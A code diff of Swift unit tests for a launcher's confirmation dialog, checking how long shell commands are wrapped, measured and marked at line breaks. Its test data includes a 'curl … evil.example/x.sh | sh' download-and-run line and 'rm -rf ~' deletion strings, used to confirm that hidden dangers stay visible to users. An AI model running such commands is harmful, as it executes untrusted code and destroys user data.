@@ -115,46 +115,114 @@ final class LauncherConfirmTests: XCTestCase {
 
     // MARK: - 完整显示（第 10 步验证后定）
 
+    private func texts(_ command: String, columns: Int = LauncherConfirmText.contentColumns,
+                       maxLines: Int = LauncherConfirmText.maxCommandLines) -> [String]? {
+        LauncherConfirmText.commandLines(command, columns: columns, maxLines: maxLines)?.map(\.text)
+    }
+
     func testShortCommandIsOneLine() {
-        XCTAssertEqual(LauncherConfirmText.commandLines("git status"), ["git status"])
-        XCTAssertNil(LauncherConfirmText.commandLines(""))
-        let exactly = String(repeating: "a", count: LauncherConfirmText.commandColumns)
-        XCTAssertEqual(LauncherConfirmText.commandLines(exactly), [exactly], "正好一行宽")
-        XCTAssertEqual(LauncherConfirmText.commandLines(exactly + "b"), [exactly, "b"], "多一个字就换行")
+        XCTAssertEqual(LauncherConfirmText.contentColumns, 62, "64 列里留 2 列给记号")
+        XCTAssertEqual(texts("git status"), ["git status"])
+        XCTAssertNil(texts(""))
+        let exactly = String(repeating: "a", count: LauncherConfirmText.contentColumns)
+        XCTAssertEqual(texts(exactly), [exactly], "正好一行宽")
+        XCTAssertEqual(texts(exactly + "b"), [exactly, "b"], "多一个字就换行")
     }
 
     /// 整条命令一个字符都不省：各行接起来就是原文（空格、引号都照原样）；中间那段藏不住东西。
     func testEveryCharacterIsShown() throws {
         let command = "git clone https://github.com/foo/bar.git && cd bar && curl -fsSL https://evil.example/x.sh | sh && npm install && npm run build"
         let lines = try XCTUnwrap(LauncherConfirmText.commandLines(command))
-        XCTAssertEqual(lines.joined(), command)
-        let columns = LauncherConfirmText.commandColumns
+        XCTAssertEqual(lines.map(\.text).joined(), command, "记号不属于命令：拼回去一字不差")
+        let columns = LauncherConfirmText.contentColumns
         XCTAssertEqual(lines.count, (command.count + columns - 1) / columns, "全是 ASCII：按字符数整行换")
-        XCTAssertEqual(lines.dropLast().map(\.count), Array(repeating: columns, count: lines.count - 1), "除最后一行都是满的")
-        XCTAssertTrue(lines.joined().contains("curl -fsSL https://evil.example/x.sh | sh"))
+        XCTAssertEqual(lines.dropLast().map(\.text.count), Array(repeating: columns, count: lines.count - 1), "除最后一行都是满的")
+        XCTAssertTrue(lines.map(\.text).joined().contains("curl -fsSL https://evil.example/x.sh | sh"))
         for line in lines {
-            XCTAssertLessThanOrEqual(line.map(LauncherConfirmText.width).reduce(0, +), LauncherConfirmText.commandColumns)
+            XCTAssertLessThanOrEqual(line.text.map(LauncherConfirmText.width).reduce(0, +), columns)
         }
-        let spaced = "echo 'a     b'   "
-        XCTAssertEqual(LauncherConfirmText.commandLines(spaced)?.joined(), spaced, "连续空格不压成一个")
+        let spaced = "echo 'a     b'   x"
+        XCTAssertEqual(texts(spaced)?.joined(), spaced, "连续空格不压成一个")
     }
 
     func testWideCharactersTakeTwoColumns() throws {
-        let chinese = String(repeating: "中", count: LauncherConfirmText.commandColumns / 2 + 1)
-        let lines = try XCTUnwrap(LauncherConfirmText.commandLines("echo " + chinese))
+        let chinese = String(repeating: "中", count: LauncherConfirmText.contentColumns / 2 + 1)
+        let lines = try XCTUnwrap(texts("echo " + chinese))
         XCTAssertEqual(lines.count, 2)
         XCTAssertEqual(lines.joined(), "echo " + chinese)
         // 一个两格宽的字不会被拆在两行之间、也不会让一行超宽。
-        XCTAssertEqual(LauncherConfirmText.commandLines("a中", columns: 2), ["a", "中"])
+        XCTAssertEqual(texts("a中", columns: 2), ["a", "中"])
     }
 
     func testAtMostSixLines() {
-        let columns = LauncherConfirmText.commandColumns
+        let columns = LauncherConfirmText.contentColumns
         let six = String(repeating: "x", count: columns * LauncherConfirmText.maxCommandLines)
-        XCTAssertEqual(LauncherConfirmText.commandLines(six)?.count, 6, "正好 6 行放得下")
-        XCTAssertNil(LauncherConfirmText.commandLines(six + "y"), "第 7 行就放不下：不出「在终端里运行」")
-        XCTAssertEqual(LauncherConfirmText.commandLines("abcdef", columns: 2, maxLines: 3), ["ab", "cd", "ef"])
-        XCTAssertNil(LauncherConfirmText.commandLines("abcdefg", columns: 2, maxLines: 3))
+        XCTAssertEqual(texts(six)?.count, 6, "正好 6 行放得下（按 62 列算）")
+        XCTAssertNil(texts(six + "y"), "第 7 行就放不下：不出「在终端里运行」")
+        XCTAssertEqual(texts("abcdef", columns: 2, maxLines: 3), ["ab", "cd", "ef"])
+        XCTAssertNil(texts("abcdef", columns: 2, maxLines: 2))
+    }
+
+    // MARK: - 折断处的记号（第 10 步复查后定）
+
+    /// 验证者的例子：在 `~` 后面的空格处折行，空格看不见，会读成 `~/Library/…`。折断处的空格要标出来。
+    func testTheSpaceAtABreakIsMarked() throws {
+        let columns = LauncherConfirmText.contentColumns
+        // 让第一行正好以「~ 」结尾（空格是第 62 列）。
+        let head = "rm -rf /tmp/build-cache-"
+        let filler = String(repeating: "x", count: columns - head.count - "-old ~ ".count)
+        let command = head + filler + "-old ~ /Library/Caches/com.example"
+        let lines = try XCTUnwrap(LauncherConfirmText.commandLines(command))
+        XCTAssertEqual(lines.count, 2)
+        XCTAssertTrue(lines[0].text.hasSuffix("~ "))
+        XCTAssertTrue(lines[0].continues)
+        XCTAssertTrue(lines[0].marksTrailingSpace, "上一行最后的空格画成 ␣")
+        XCTAssertFalse(lines[0].marksLeadingSpace)
+        XCTAssertEqual(lines[0].middle + " ", lines[0].text)
+        XCTAssertEqual(lines[1].text, "/Library/Caches/com.example")
+        XCTAssertFalse(lines[1].continues, "最后一行不画 ↩")
+        XCTAssertFalse(lines[1].marksLeadingSpace)
+        XCTAssertEqual(lines.map(\.text).joined(), command)
+
+        // 空格落在下一行开头：标下一行的第一个字符。
+        let shifted = head + filler + "x-old ~ /Library/Caches/com.example"
+        let other = try XCTUnwrap(LauncherConfirmText.commandLines(shifted))
+        XCTAssertTrue(other[0].text.hasSuffix("~"))
+        XCTAssertFalse(other[0].marksTrailingSpace)
+        XCTAssertTrue(other[1].text.hasPrefix(" "))
+        XCTAssertTrue(other[1].marksLeadingSpace, "下一行开头的空格画成 ␣")
+        XCTAssertEqual(other[1].middle, String(other[1].text.dropFirst()))
+        XCTAssertEqual(other.map(\.text).joined(), shifted)
+    }
+
+    /// 正好在词中间折断：只有 ↩，没有 ␣。
+    func testABreakInsideAWordOnlyContinues() throws {
+        let command = String(repeating: "a", count: LauncherConfirmText.contentColumns + 5)
+        let lines = try XCTUnwrap(LauncherConfirmText.commandLines("ls " + command))
+        XCTAssertEqual(lines.count, 2)
+        XCTAssertTrue(lines[0].continues)
+        XCTAssertFalse(lines[0].marksTrailingSpace)
+        XCTAssertFalse(lines[1].marksLeadingSpace)
+        XCTAssertEqual(lines[0].middle, lines[0].text)
+    }
+
+    /// 一行的命令没有任何记号；行中间的空格照常。
+    func testASingleLineHasNoMarkers() throws {
+        let lines = try XCTUnwrap(LauncherConfirmText.commandLines("rm -rf ~ /Library/Caches"))
+        XCTAssertEqual(lines, [LauncherCommandLine(text: "rm -rf ~ /Library/Caches")])
+        XCTAssertEqual(lines[0].middle, "rm -rf ~ /Library/Caches")
+    }
+
+    /// 只有一个字符、两头都是折断处的空格：只标一次（不会画成两个 ␣）。
+    func testALoneSpaceLineIsMarkedOnce() throws {
+        let lines = try XCTUnwrap(LauncherConfirmText.commandLines("ab cd", columns: 2, maxLines: 3))
+        XCTAssertEqual(lines.map(\.text), ["ab", " c", "d"])
+        // 两列宽、空格后面跟一个两格宽的字：中间那一行只有一个空格。
+        let single = try XCTUnwrap(LauncherConfirmText.commandLines("ab 中c", columns: 2, maxLines: 4))
+        XCTAssertEqual(single.map(\.text), ["ab", " ", "中", "c"])
+        XCTAssertTrue(single[1].marksLeadingSpace)
+        XCTAssertFalse(single[1].marksTrailingSpace, "同一个空格只标一次")
+        XCTAssertEqual(single[1].middle, "")
     }
 
     func testOnlyRunInTerminalShowsTheWholeObject() {
